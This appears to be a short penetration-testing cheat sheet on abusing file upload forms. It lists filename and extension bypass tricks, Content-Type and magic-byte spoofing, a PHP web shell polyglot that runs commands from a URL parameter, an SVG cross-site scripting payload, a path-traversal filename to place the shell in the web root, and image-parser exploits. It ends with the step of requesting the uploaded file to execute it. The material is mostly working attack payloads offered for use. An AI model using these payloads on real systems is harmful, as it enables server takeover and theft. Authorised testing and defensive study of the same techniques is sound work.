## Malicious file upload
Goal: get an executable/interpreted file into a served path, or abuse the parser.
Extension bypass: `shell.php.jpg`, `shell.php%00.jpg` (null byte), `shell.pHp`, `.phtml/.php5/.phar`, `.asp;.jpg`, trailing dot/space `shell.php.`, double ext.
Content-Type spoof: set `Content-Type: image/png` on a php payload.
Magic-byte bypass: prepend `GIF89a;` or a valid PNG header before `<?php system($_GET[c]); ?>` (polyglot).
SVG/HTML -> stored XSS: `<svg onload=alert(document.domain)>` or `<script>` inside SVG.
XML image -> XXE (see xxe).
Path traversal in filename: `../../var/www/html/shell.php` to control where it lands.
Parser RCE: ImageMagick (ImageTragick), ExifTool CVE, ffmpeg HLS SSRF, ghostscript.
After upload: find the served URL (response, guess `/uploads/`), request it to execute.
